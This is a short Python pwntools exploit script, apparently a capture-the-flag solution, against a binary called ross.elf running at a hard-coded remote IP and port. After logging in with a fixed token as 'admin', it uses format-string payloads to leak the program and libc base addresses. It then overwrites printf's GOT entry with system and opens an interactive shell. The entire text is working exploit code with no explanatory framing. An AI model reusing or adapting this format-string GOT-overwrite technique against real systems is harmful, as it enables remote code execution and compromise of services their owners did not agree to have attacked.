from pwn import *

def pad(s, size):
    assert len(s) <= size
    return s + '_' * (size - len(s))


#p = process('./ross.elf')
p = remote('82.196.10.106', 31337)
elf = ELF('./ross.elf')
libc = ELF('../libc.so.6')

p.recvuntil('token: ')
p.sendline('1899133799910931337')
p.recvuntil('nick: ')
p.sendline('admin')

p.recvuntil('>> ')
p.sendline('1')

def get_cmd(fmt):
    p.recvuntil('admin: ')
    p.sendline('\\' + fmt)
    p.recvuntil('invalid: \\')
    return p.recvline('\n')[:-1]

# Leak prog base
prog_base = int(get_cmd('%9$p'), 0) 
print(hex(prog_base))
prog_base -= 0x1ea2
log.success('Progbase: 0x{:016x}'.format(prog_base))

# Leak libc
got_printf = elf.got.printf
leak = get_cmd('%15$s| ' + p64(prog_base + got_printf))
print(leak)
assert(leak[6] == '|')
log.info('Leaked: ' + enhex(leak))

libc_base = u64(leak[:6] + '\0\0') - libc.symbols.printf
log.info('Libc: 0x{:016x}'.format(libc_base))

# Now overwrite GOT
libc_system = libc_base + libc.symbols.system
need = (libc_system - 17) & 0xffff
need2 = ((libc_system >> 16) - need - 17) & 0xffff
fmt = '%{}c%18$hn%{}c%19$hn'.format(need, need2)

fmt = pad(fmt, 31) + p64(prog_base + got_printf) + p64(prog_base + got_printf + 2)

p.recvuntil('admin: ')
p.sendline('\\' + fmt)

p.sendline('\\\\;sh')


p.interactive()
